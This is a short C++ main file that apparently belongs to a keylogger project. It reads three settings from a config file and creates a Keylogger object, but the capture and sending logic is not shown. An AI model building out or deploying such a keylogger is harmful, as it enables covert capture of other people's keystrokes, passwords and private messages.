#include <iostream>

#include "Keylogger/Keylogger.hpp"
#include "ConfigParser/ConfigParser.hpp"
#include "constant.cpp"

int main(void)
{
    ConfigParser config {kl::CONFIG_PATH};
    kl::Keylogger logger {config.getField(kl::CONFIG_FIELD[0]), config.getField(kl::CONFIG_FIELD[1]) == "true" ? true : false, config.getListField(kl::CONFIG_FIELD[2])};



    return 0;
}
